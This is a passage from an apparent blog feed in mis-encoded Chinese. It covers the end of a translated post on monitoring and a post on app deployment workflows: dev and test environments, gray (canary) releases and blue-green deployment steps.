&lt;p&gt;ç›‘æ§ç³»ç»Ÿä¸åº”è¯¥åªæ˜¯å‘Šè¯‰ä½ â€œè¿™æœ‰ä¸€ä¸ªé—®é¢˜â€ï¼Œå®ƒä¹Ÿè¦å¸®åŠ©ä½ æ’æŸ¥é—®é¢˜å‡ºç°çš„åŸå› ,ä½ ä¸åªæ˜¯æƒ³åœ¨æœåŠ¡å˜æ…¢çš„æ—¶å€™æ”¶åˆ°æŠ¥è­¦ï¼Œä½ å…¶å®æƒ³çŸ¥é“è¿‡å»å‡ å°æ—¶æµé‡æ˜¯å¦å¢åŠ äº†ï¼Œæœºå™¨æ˜¯ä¸æ˜¯å®•æœºäº†ï¼Œåç«¯æœåŠ¡å™¨æ˜¯ä¸æ˜¯å˜æ…¢äº†æˆ–è€…å†…éƒ¨æ‰§è¡Œæ—¶é—´å˜é•¿äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Prometheus-Overview-1.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;åœ¨ä½ çš„åº”ç”¨ä¸­é›†æˆç›‘æ§æ¨¡å—&lt;/p&gt;
&lt;p&gt;åšä¸ºæŠ¥è­¦å’Œæ’é”™é‡è¦æ‰‹æ®µï¼Œç›‘æ§è¦åœ¨ä½ çš„æ¶æ„ä½“ç³»ä¸­æ‹¥æœ‰æ ¸å¿ƒä½ç½®ã€‚è¦é›†æˆç›‘æ§å·¥å…·åœ¨ä½ çš„æ‰€æœ‰ä»£ç é€»è¾‘ä¸­ï¼Œè€Œä¸ä»…ä»…æ˜¯åœ¨è¾¹ç¼˜åŒºåŸŸæ·»åŠ ä¸€ç‚¹ã€‚è·Ÿè¸ªæ¯ä¸ªè¯·æ±‚æäº¤apiéœ€è¦å¤šå°‘ç»„ä»¶ï¼Œä»¥ä¾¿ä½ åœ¨è®¾è®¡æ–°çš„å­˜å‚¨ç³»ç»Ÿæ˜¯å¦èƒ½å¤ŸçŸ¥é“è¦å¤„ç†å¤šå°‘æ•°æ®ï¼Œè·Ÿè¸ªå†…å­˜çš„å‘½ä¸­ç‡ï¼Œä»¥ä¾¿ä½ èƒ½åº¦é‡å®ƒä»¬éšç€æµé‡æ¨¡å¼å˜åŒ–çš„è§„å¾‹ï¼Œç”šè‡³åˆ†è§£åˆ°memcachedä¸­æ¥èŠ‚çœå†…å­˜å’Œæé«˜å‘½ä¸­ç‡ã€‚è·Ÿè¸ªç”¨æˆ·å‘½ä¸­ä½ çš„ä¸šåŠ¡é€»è¾‘çš„â€æ…¢è·¯å¾„â€œï¼Œä»¥ä¾¿ä½ çŸ¥é“å®ƒä»€ä¹ˆæ—¶å€™å¯ä»¥æ›´å¿«ï¼Œå¹¶ä¸”å½“æ–°çš„åŠŸèƒ½ä½¿ç”¨â€æ…¢è·¯å¾„â€œçš„æ—¶å€™ï¼Œä½ å·²ç»å‡†å¤‡å¥½äº†è®©å®ƒâ€å»¶è¿Ÿå‘½ä¸­â€œã€‚&lt;br&gt;åœ¨ä½ çš„ä»£ç å†…éƒ¨ï¼Œåšè¿™æ ·å¤§é‡çš„ç»†èŠ‚å·¥ä½œï¼Œå¯ä»¥è®©ä½ å‰è¿›çš„æ›´å¿«ï¼ŒæŠ€æœ¯å’Œäº§å“å†³ç­–ä¼šå—ç›Šè‰¯å¤šï¼Œæ ¹æœ¬ä¸Šæå‡äº†ä½ çš„æ•ˆç‡ã€‚è¿™å°±æ˜¯ç›‘æ§çš„æ„ä¹‰æ‰€åœ¨ï¼Œç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åŸæ–‡ &lt;a href=&quot;https://www.robustperception.io/monitoring-not-just-for-outages/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.robustperception.io/monitoring-not-just-for-outages/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ&quot;&gt;&lt;a href=&quot;#ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ&quot; class=&quot;headerlink&quot; title=&quot;ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ&quot;&gt;&lt;/a&gt;ã€ç¿»è¯‘ã€‘ç›‘æ§ä¸åªæ˜¯ä¸ºäº†å¤„ç†æ•…éšœ&lt;/h3&gt;&lt;p&gt;æœ‰ä¸€ç§æ™®éçš„æƒ³æ³•è®¤ä¸ºç›‘æ§åªæ˜¯åœ¨ç³»ç»Ÿå‡º
    
    </summary>
    
      <category term="è¿ç»´ç¬”è®°" scheme="http://blog.yangcvo.me/categories/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Performance monitoring" scheme="http://blog.yangcvo.me/tags/Performance-monitoring/"/>
    
  </entry>
  
  <entry>
    <title>APPè‡ªåŠ¨åŒ–éƒ¨ç½²:å¼€å‘éƒ¨ç½²-æµ‹è¯•éƒ¨ç½²-ç°åº¦å‘å¸ƒ/è“ç»¿éƒ¨ç½²-ç”Ÿäº§ç¯å¢ƒç­‰éƒ¨ç½²æµç¨‹æ–¹æ¡ˆæ€»ç»“</title>
    <link href="http://blog.yangcvo.me/2017/03/15/%E8%BF%90%E7%BB%B4%E7%AC%94%E8%AE%B0/APP%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2:%E5%BC%80%E5%8F%91%E9%83%A8%E7%BD%B2-%E6%B5%8B%E8%AF%95%E9%83%A8%E7%BD%B2-%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83:%E8%93%9D%E7%BB%BF%E9%83%A8%E7%BD%B2-%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%AD%89%E9%83%A8%E7%BD%B2%E6%B5%81%E7%A8%8B%E6%96%B9%E6%A1%88%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.yangcvo.me/2017/03/15/è¿ç»´ç¬”è®°/APPè‡ªåŠ¨åŒ–éƒ¨ç½²:å¼€å‘éƒ¨ç½²-æµ‹è¯•éƒ¨ç½²-ç°åº¦å‘å¸ƒ:è“ç»¿éƒ¨ç½²-ç”Ÿäº§ç¯å¢ƒç­‰éƒ¨ç½²æµç¨‹æ–¹æ¡ˆæ€»ç»“/</id>
    <published>2017-03-15T03:33:17.000Z</published>
    <updated>2017-04-13T07:22:56.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;APPè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šå¼€å‘éƒ¨ç½²ã€æµ‹è¯•éƒ¨ç½²ã€ç°åº¦å‘å¸ƒç­‰éƒ¨ç½²æ–¹æ¡ˆå¯¹æ¯”ä¸æ€»ç»“&quot;&gt;&lt;a href=&quot;#APPè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šå¼€å‘éƒ¨ç½²ã€æµ‹è¯•éƒ¨ç½²ã€ç°åº¦å‘å¸ƒç­‰éƒ¨ç½²æ–¹æ¡ˆå¯¹æ¯”ä¸æ€»ç»“&quot; class=&quot;headerlink&quot; title=&quot;APPè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šå¼€å‘éƒ¨ç½²ã€æµ‹è¯•éƒ¨ç½²ã€ç°åº¦å‘å¸ƒç­‰éƒ¨ç½²æ–¹æ¡ˆå¯¹æ¯”ä¸æ€»ç»“&quot;&gt;&lt;/a&gt;APPè‡ªåŠ¨åŒ–éƒ¨ç½²ï¼šå¼€å‘éƒ¨ç½²ã€æµ‹è¯•éƒ¨ç½²ã€ç°åº¦å‘å¸ƒç­‰éƒ¨ç½²æ–¹æ¡ˆå¯¹æ¯”ä¸æ€»ç»“&lt;/h1&gt;&lt;h4 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h4&gt;&lt;p&gt;ä¸ªäººç°åœ¨åœ¨ä¸€ä¸ªåŒ»ç–—è¡Œä¸šå…¬å¸ï¼šç¾å¹´å¤§è¿™è¾¹è´Ÿè´£ä½“æ£€APPçš„è¿ç»´ç›¸å…³å·¥ä½œï¼Œä»Šå¤©ä¸»è¦æ˜¯æ•´ç†äº†ä¸‹ç°åœ¨å›¢é˜ŸAPPå‘å¸ƒæµç¨‹&lt;br&gt;æ–¹æ¡ˆï¼š&lt;/p&gt;
&lt;p&gt;å› ä¸ºåœ¨é¡¹ç›®è¿­ä»£çš„è¿‡ç¨‹ä¸­ï¼Œä¸å¯é¿å…éœ€è¦â€ä¸Šçº¿â€ã€‚ä¸Šçº¿å¯¹åº”ç€éƒ¨ç½²ï¼Œæˆ–è€…é‡æ–°éƒ¨ç½²ï¼›éƒ¨ç½²å¯¹åº”ç€ä¿®æ”¹ï¼›ä¿®æ”¹åˆ™æ„å‘³ç€é£é™©ã€‚&lt;br&gt;ç›®å‰æœ‰å¾ˆå¤šç”¨äºéƒ¨ç½²çš„æŠ€æœ¯ï¼Œæœ‰çš„ç®€å•ï¼Œæœ‰çš„å¤æ‚ï¼›æœ‰çš„å¾—åœæœºï¼Œæœ‰çš„ä¸éœ€è¦åœæœºå³å¯å®Œæˆéƒ¨ç½²ã€‚&lt;/p&gt;
&lt;p&gt;ä¸ªäººæ•´ç†ä¸‹éƒ¨ç½²æµç¨‹è¯´æ˜å…¶å®ç°åœ¨å¾ˆå¤šéƒ¨ç½²æ–¹æ³•ï¼Œç°åœ¨æˆ‘ä»¬ç”¨ç›®å‰æ¯”è¾ƒæµè¡Œçš„å‡ ç§éƒ¨ç½²æ–¹æ¡ˆï¼Œæˆ–è€…è¯´ç­–ç•¥æ–¹æ¡ˆå¯¹æ¯”æ€»ç»“ç®€å•è®¨è®ºä¸€ä¸‹ç›®å‰æ¯”è¾ƒæµè¡Œçš„å‡ ç§éƒ¨ç½²æ–¹æ¡ˆï¼Œæˆ–è€…è¯´ç­–ç•¥ã€‚å¦‚æœ‰ä¸è¶³ä¹‹å¤„è¯·æŒ‡å‡ºï¼Œå¦‚æœ‰è°¬è¯¯ï¼Œè¯·æŒ‡æ­£^_^ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬æœ‰è‡ªå·±å¼€å‘ç¯å¢ƒå’Œæµ‹è¯•ç¯å¢ƒ ï¼š&lt;/p&gt;
&lt;h4 id=&quot;å¼€å‘ç¯å¢ƒéƒ¨ç½²ï¼š&quot;&gt;&lt;a href=&quot;#å¼€å‘ç¯å¢ƒéƒ¨ç½²ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å¼€å‘ç¯å¢ƒéƒ¨ç½²ï¼š&quot;&gt;&lt;/a&gt;å¼€å‘ç¯å¢ƒéƒ¨ç½²ï¼š&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;é—®é¢˜ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¼€å‘äººå‘˜æ¯ä¸ªäººåœ¨è‡ªå·±ç”µè„‘ç¯å¢ƒå†™ä»£ç è‡ªå·±ç”µè„‘æœ¬æœºæµ‹è¯•ä»£ç æ˜¯å¦runæˆåŠŸï¼Œæ¯ä¸ªå¼€å‘äººå‘˜éƒ½åœ¨è‡ªå·±æœ¬åœ°å†™å®Œæµ‹è¯•å‡ºç°é—®é¢˜æ˜¯å„è‡ªç¯å¢ƒä¸ç»Ÿä¸€å¯¼è‡´é‡åˆ°å‘é˜»ç¢åˆ°æµ‹è¯•äººå‘˜æµ‹è¯•ï¼ŒåŸºç¡€çš„bugä¹Ÿä¼šæµªè´¹å¤ªå¤šæ—¶é—´ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è§£å†³åï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸»è¦æ˜¯è§£å†³äº†ç»™äºˆå¼€å‘å›¢é˜Ÿåœ¨å†™ä»£ç æˆ–è€…ä¿®æ”¹bugå¯ä»¥ç¬¬ä¸€æ—¶é—´æ›´æ–°éƒ¨ç½²ã€‚å¤§å®¶ç»Ÿä¸€ä¸€ä¸ªå¼€å‘ç¯å¢ƒè¿™ä¸ªæ˜¯ä¸ºäº†åœ¨å¼€å‘é˜¶æ®µèƒ½ç«‹é©¬å‘ˆç°æ•ˆæœã€‚&lt;/p&gt;
&lt;h4 id=&quot;æµ‹è¯•ç¯å¢ƒéƒ¨ç½²ï¼š&quot;&gt;&lt;a href=&quot;#æµ‹è¯•ç¯å¢ƒéƒ¨ç½²ï¼š&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•ç¯å¢ƒéƒ¨ç½²ï¼š&quot;&gt;&lt;/a&gt;æµ‹è¯•ç¯å¢ƒéƒ¨ç½²ï¼š&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;é—®é¢˜ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸€å¼€å§‹æ²¡æœ‰æµ‹è¯•ç¯å¢ƒï¼Œç›´æ¥å¼€å‘ç¯å¢ƒå½“ä½œæµ‹è¯•ç¯å¢ƒå»è·‘ï¼Œå‘ç°å¾ˆå¤šé—®é¢˜ï¼Œå°±æ˜¯æµ‹è¯•ç¯å¢ƒæ•°æ®è·Ÿç”Ÿäº§ä¸ä¸€æ ·ï¼Œå¯¼è‡´å¾ˆå¤šbugé—®é¢˜ï¼Œæµ‹è¯•å‘ç°æµ‹è¯•çš„æ—¶å€™ï¼Œå¼€å‘åœ¨æ›´æ–°ä»£ç å‘å¸ƒï¼Œè€½è¯¯äº†æµ‹è¯•äººå‘˜çš„æµ‹è¯•è¿‡ç¨‹ï¼Œç¯å¢ƒä¸èƒ½ç‹¬ç«‹éƒ½äº’ç›¸å ç”¨ï¼Œåˆ€å­æ•ˆç‡æ²¡æœ‰æé«˜ï¼Œbugæ¯ä¸ªæ˜ŸæœŸéƒ½ä¸æ–­æå‡ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è§£å†³åï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸»è¦è§£å†³äº†å¼€å‘ç¯å¢ƒå’Œæµ‹è¯•ç¯å¢ƒç‹¬ç«‹ï¼Œä¸ä¼šäº’ç›¸å½±å“ï¼Œæµ‹è¯•äººå‘˜æœ‰å•ç‹¬ç¯å¢ƒå»æµ‹è¯•ç”Ÿäº§èƒ½å‡†ç¡®çš„æ•°æ®å¯¹æ¯”ã€‚&lt;/p&gt;
&lt;h4 id=&quot;é€‰æ‹©ç°åº¦ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼š&quot;&gt;&lt;a href=&quot;#é€‰æ‹©ç°åº¦ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼š&quot; class=&quot;headerlink&quot; title=&quot;é€‰æ‹©ç°åº¦ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼š&quot;&gt;&lt;/a&gt;é€‰æ‹©ç°åº¦ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼š&lt;/h4&gt;&lt;p&gt;å…ˆè´´ä¸ªç™¾åº¦ç™¾ç§‘ï¼š&lt;/p&gt;
&lt;p&gt;ç°åº¦å‘å¸ƒæ˜¯æŒ‡åœ¨é»‘ä¸ç™½ä¹‹é—´ï¼Œèƒ½å¤Ÿå¹³æ»‘è¿‡æ¸¡çš„ä¸€ç§å‘å¸ƒæ–¹å¼ã€‚AB testå°±æ˜¯ä¸€ç§ç°åº¦å‘å¸ƒæ–¹å¼ï¼Œè®©ä¸€éƒ¨åˆ†ç”¨æˆ·ç»§ç»­ç”¨Aï¼Œä¸€éƒ¨åˆ†ç”¨æˆ·å¼€å§‹ç”¨Bï¼Œå¦‚æœç”¨æˆ·å¯¹Bæ²¡æœ‰ä»€ä¹ˆåå¯¹æ„è§ï¼Œé‚£ä¹ˆé€æ­¥æ‰©å¤§èŒƒå›´ï¼ŒæŠŠæ‰€æœ‰ç”¨æˆ·éƒ½è¿ç§»åˆ°Bä¸Šé¢æ¥ã€‚ç°åº¦å‘å¸ƒå¯ä»¥ä¿è¯æ•´ä½“ç³»ç»Ÿçš„ç¨³å®šï¼Œåœ¨åˆå§‹ç°åº¦çš„æ—¶å€™å°±å¯ä»¥å‘ç°ã€è°ƒæ•´é—®é¢˜ï¼Œä»¥ä¿è¯å…¶å½±å“åº¦ã€‚&lt;/p&gt;
&lt;p&gt;ç°åº¦ç¯å¢ƒéƒ¨ç½²:&lt;/p&gt;
&lt;p&gt;ä¸ªäººç†è§£ç°åº¦éƒ¨ç½²æ˜¯å¢é‡å‘å¸ƒçš„ä¸€ç§ç±»å‹ï¼Œå®ƒçš„æ‰§è¡Œæ–¹å¼æ˜¯åœ¨åŸæœ‰è½¯ä»¶ç”Ÿäº§ç‰ˆæœ¬å¯ç”¨çš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶éƒ¨ç½²ä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ã€‚åŒæ—¶è¿è¡ŒåŒä¸€ä¸ªè½¯ä»¶äº§å“çš„å¤šä¸ªç‰ˆæœ¬éœ€è¦è½¯ä»¶é’ˆå¯¹é…ç½®å’Œå®Œç¾è‡ªåŠ¨åŒ–éƒ¨ç½²è¿›è¡Œç‰¹åˆ«è®¾è®¡ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight gcode&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(1)&lt;/span&gt; å‡†å¤‡å¥½éƒ¨ç½²å„ä¸ªé˜¶æ®µçš„å·¥ä»¶ï¼ŒåŒ…æ‹¬ï¼šæ„å»ºå·¥ä»¶ï¼Œæµ‹è¯•è„šæœ¬ï¼Œé…ç½®æ–‡ä»¶å’Œéƒ¨ç½²æ¸…å•æ–‡ä»¶ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(2)&lt;/span&gt; ä»è´Ÿè½½å‡è¡¡åˆ—è¡¨ä¸­ç§»é™¤æ‰â€œéƒ¨ç½²ç°åº¦ç¯å¢ƒâ€æœåŠ¡å™¨ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(3)&lt;/span&gt; å‡çº§â€œç°åº¦éƒ¨ç½²â€åº”ç”¨ï¼ˆæ’æ‰åŸæœ‰æµé‡å¹¶è¿›è¡Œéƒ¨ç½²ï¼‰ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(4)&lt;/span&gt; å¯¹åº”ç”¨è¿›è¡Œè‡ªåŠ¨åŒ–æµ‹è¯•ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(5)&lt;/span&gt; å°†â€œç°åº¦ç¯å¢ƒâ€æœåŠ¡å™¨é‡æ–°æ·»åŠ åˆ°è´Ÿè½½å‡è¡¡åˆ—è¡¨ä¸­ï¼ˆè¿é€šæ€§å’Œå¥åº·æ£€æŸ¥ï¼‰ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;(6)&lt;/span&gt; å¦‚æœâ€œç°åº¦ç¯å¢ƒâ€åœ¨çº¿ä½¿ç”¨æµ‹è¯•æˆåŠŸï¼Œå‡çº§å‰©ä½™çš„å…¶ä»–æœåŠ¡å™¨ã€‚ï¼ˆå¦åˆ™å°±å›æ»šï¼‰&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ç°åº¦å‘å¸ƒä¸­ï¼Œå¸¸å¸¸æŒ‰ç…§ç”¨æˆ·è®¾ç½®è·¯ç”±æƒé‡ï¼Œä¾‹å¦‚&lt;span class=&quot;number&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;meta&quot;&gt;%&lt;/span&gt;çš„ç”¨æˆ·ç»´æŒä½¿ç”¨è€ç‰ˆæœ¬ï¼Œ&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;meta&quot;&gt;%&lt;/span&gt;çš„ç”¨æˆ·å°é²œæ–°ç‰ˆæœ¬ã€‚ä¸åŒç‰ˆæœ¬åº”ç”¨å…±å­˜ï¼Œç»å¸¸ä¸A/Bæµ‹è¯•ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºæµ‹è¯•é€‰æ‹©å¤šç§æ–¹æ¡ˆã€‚ç°åº¦å‘å¸ƒæ¯”è¾ƒå…¸å‹çš„ä¾‹å­&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç¬¬1æ­¥: æŠŠç»¿è‰²é›†ç¾¤çš„çŠ¶æ€æ”¹ä¸ºâ€™å¤‡ç”¨â€™. ä»è´Ÿè½½å‡è¡¡çš„æ± é‡ŒæŠŠè¿™äº›åœ°å€å»æ‰,è¿™æ ·,ç»¿è‰²çš„é›†ç¾¤å°±ä¸å†å›æ¥æ”¶åˆ°æ¥è‡ªç”¨æˆ·çš„è¯·æ±‚äº†.è½¬è€Œè¿›å…¥å¤‡ç”¨è´Ÿè½½å‡è¡¡çš„æ± é‡Œ.&lt;/p&gt;
&lt;h3 id=&quot;é€‰æ‹©è“ç»¿ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼š&quot;&gt;&lt;a href=&quot;#é€‰æ‹©è“ç»¿ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼š&quot; class=&quot;headerlink&quot; title=&quot;é€‰æ‹©è“ç»¿ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼š&quot;&gt;&lt;/a&gt;é€‰æ‹©è“ç»¿ç¯å¢ƒéƒ¨ç½²æ–¹æ¡ˆï¼š&lt;/h3&gt;&lt;h5 id=&quot;è“ç»¿å‘å¸ƒçš„æ„ä¹‰&quot;&gt;&lt;a href=&quot;#è“ç»¿å‘å¸ƒçš„æ„ä¹‰&quot; class=&quot;headerlink&quot; title=&quot;è“ç»¿å‘å¸ƒçš„æ„ä¹‰&quot;&gt;&lt;/a&gt;è“ç»¿å‘å¸ƒçš„æ„ä¹‰&lt;/h5&gt;&lt;p&gt;æ•´ä¸ªå‘å¸ƒè¿‡ç¨‹ï¼Œç”¨æˆ·æ²¡æœ‰æ„Ÿå—åˆ°ä»»ä½•å®•æœºæˆ–è€…æœåŠ¡é‡å¯ã€‚&lt;/p&gt;
&lt;h5 id=&quot;è“ç»¿å‘å¸ƒçš„è¿‡ç¨‹&quot;&gt;&lt;a href=&quot;#è“ç»¿å‘å¸ƒçš„è¿‡ç¨‹&quot; class=&quot;headerlink&quot; title=&quot;è“ç»¿å‘å¸ƒçš„è¿‡ç¨‹&quot;&gt;&lt;/a&gt;è“ç»¿å‘å¸ƒçš„è¿‡ç¨‹&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;ç¬¬0æ­¥:éƒ¨ç½²ä»¥å‰çš„é…ç½®&lt;br&gt;&lt;img src=&quot;http://1.bp.blogspot.com/-K8gbbN7S_xo/UmbijDyvS4I/AAAAAAAAE5M/3DCOJRrrbIY/s1600/Blue+Green+Deployment+for+Zero+Downtime+(8&quot; alt=&quot;&quot;&gt;.png)&lt;/li&gt;
&lt;li&gt;ç¬¬1æ­¥: æŠŠç»¿è‰²é›†ç¾¤çš„çŠ¶æ€æ”¹ä¸ºâ€™å¤‡ç”¨â€™. ä»è´Ÿè½½å‡è¡¡çš„æ± é‡ŒæŠŠè¿™äº›åœ°å€å»æ‰,è¿™æ ·,ç»¿è‰²çš„é›†ç¾¤å°±ä¸å†å›æ¥æ”¶åˆ°æ¥è‡ªç”¨æˆ·çš„è¯·æ±‚äº†.è½¬è€Œè¿›å…¥å¤‡ç”¨è´Ÿè½½å‡è¡¡çš„æ± é‡Œ.&lt;br&gt;&lt;img src=&quot;http://1.bp.blogspot.com/-nITj_nPp5IY/UmbiuMblJNI/AAAAAAAAE5U/ovn4sSMcFco/s1600/Blue+Green+Deployment+for+Zero+Downtime+(9&quot; alt=&quot;&quot;&gt;.png)&lt;/li&gt;
&lt;li&gt;ç¬¬2æ­¥:åœ¨ç»¿è‰²é›†ç¾¤é‡Œéƒ¨ç½²æ–°çš„ä»£ç ,ç›´åˆ°åº”ç”¨å¯åŠ¨æˆåŠŸ&lt;br&gt;&lt;img src=&quot;http://3.bp.blogspot.com/-2F2dB-vux4g/UmbheBwtcAI/AAAAAAAAE5E/1l9il1igplQ/s1600/Blue+Green+Deployment+for+Zero+Downtime+(4&quot; alt=&quot;&quot;&gt;.png)&lt;/li&gt;
&lt;li&gt;ç¬¬3æ­¥:ä½¿ç”¨å¤‡ç”¨è´Ÿè½½å‡è¡¡ç®€å•æµ‹è¯•ä¸€ä¸‹å¤‡ç”¨é›†ç¾¤çš„éƒ¨ç½²æƒ…å†µ.ç†æƒ³çŠ¶æ€ä¸‹æ˜¯å…¨è‡ªåŠ¨çš„.&lt;/li&gt;
&lt;li&gt;ç¬¬4æ­¥:æŠŠç»¿è‰²å¤‡ç”¨é›†ç¾¤çš„çŠ¶æ€æ”¹æˆå­˜è´§,äºæ˜¯è¿›å…¥äº†å­˜æ´»è´Ÿè½½å‡è¡¡çš„æ± é‡Œ&lt;br&gt;&lt;img src=&quot;http://3.bp.blogspot.com/-2F2dB-vux4g/UmbheBwtcAI/AAAAAAAAE5E/1l9il1igplQ/s1600/Blue+Green+Deployment+for+Zero+Downtime+(4&quot; alt=&quot;&quot;&gt;.png)&lt;br&gt;çœ‹åˆ° è“è‰²è¿è¡Œv1ç‰ˆæœ¬,ç»¿è‰²è¿è¡Œv2ç‰ˆæœ¬,éƒ½è¿æ¥çš„æ˜¯ç›¸åŒçš„æ•°æ®åº“.è¿™æ„å‘³ç€v2ç‰ˆæœ¬ä¹Ÿè¦åœ¨è€çš„æ•°æ®æ¨¡å‹ä¸Šè¿è¡Œ.å¦‚æœæ•°æ®åº“æœ‰å˜æ›´,è¦ç­‰åˆ°æ‰€æœ‰çš„é›†ç¾¤å‡çº§åˆ°æ–°çš„ä»£ç ä¸Š.&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¬¬5æ­¥: å¯¹è“è‰²é›†ç¾¤ä¹Ÿè¿›è¡ŒåŒæ ·çš„æ“ä½œ.&lt;br&gt;&lt;img src=&quot;http://4.bp.blogspot.com/-aTz1EdP6pb0/UmbjAx46vrI/AAAAAAAAE5c/qqxolMnae44/s640/Blue+Green+Deployment+for+Zero+Downtime+(5&quot; alt=&quot;&quot;&gt;.png)&lt;br&gt;&lt;img src=&quot;http://3.bp.blogspot.com/-95YNOBeYoUU/UmbjFq711dI/AAAAAAAAE5k/Q5Naa80xk64/s640/Blue+Green+Deployment+for+Zero+Downtime+(6&quot; alt=&quot;&quot;&gt;.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æœ€ç»ˆv2ä»£ç å®Œæˆéƒ¨ç½².&lt;br&gt;&lt;img src=&quot;http://2.bp.blogspot.com/-eh1gR1sBPNc/UmbjMkDCixI/AAAAAAAAE5s/vJOeYjV03vI/s640/Blue+Green+Deployment+for+Zero+Downtime+(7&quot; alt=&quot;&quot;&gt;.png)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç¬¬6æ­¥:æ ¹æ®æƒ…å†µ.è¿è¡Œæ•°æ®åº“è¿ç§»&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å‚è€ƒï¼štks   &lt;a href=&quot;http://sunitspace.blogspot.jp/2013/10/blue-green-deployment.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;green-deployment&lt;/a&gt;&lt;/p&gt;
